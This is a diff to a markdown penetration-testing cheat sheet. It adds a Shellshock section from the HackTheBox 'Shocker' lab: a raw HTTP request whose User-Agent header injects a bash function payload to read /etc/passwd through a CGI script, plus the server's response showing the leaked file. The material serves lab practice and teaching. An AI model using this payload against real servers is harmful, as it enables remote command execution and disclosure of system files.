@@ -19,6 +19,7 @@
 17. [Word Press](#word-press)
 18. [PHP](#php)
 19. [RSA](#rsa)
+20. [Shell Shock](#shell-shock)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -698,5 +699,62 @@ openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout key.key
 ```bash
 openssl req -x509 -sha256 -nodes -day 365 -newkey rsa:2048 -keyout key.key -out crt.crt
 ```
+
+# Shell Shock
+Example from HTB (Shocker)
+
+## Request
+```
+GET /cgi-bin/user.sh HTTP/1.1
+
+Host: 10.10.10.56
+
+User-Agent: () { :;};echo -e "\r\n$(/bin/cat /etc/passwd)"
+
+Connection: close
+
+```
+
+## Response
+```
+HTTP/1.1 200 OK
+
+Date: Tue, 06 Oct 2020 19:40:22 GMT
+
+Server: Apache/2.4.18 (Ubuntu)
+
+Connection: close
+
+Content-Type: text/x-sh
+
+Content-Length: 1687
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+.
+.
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
+
+Content-Type: text/plain
+
+Just an uptime test script
+
+ 15:40:23 up 15 min,  0 users,  load average: 0.00, 0.00, 0.00
+
+```
+
+
+
+
+
+
+
+
+
+
+
 
 
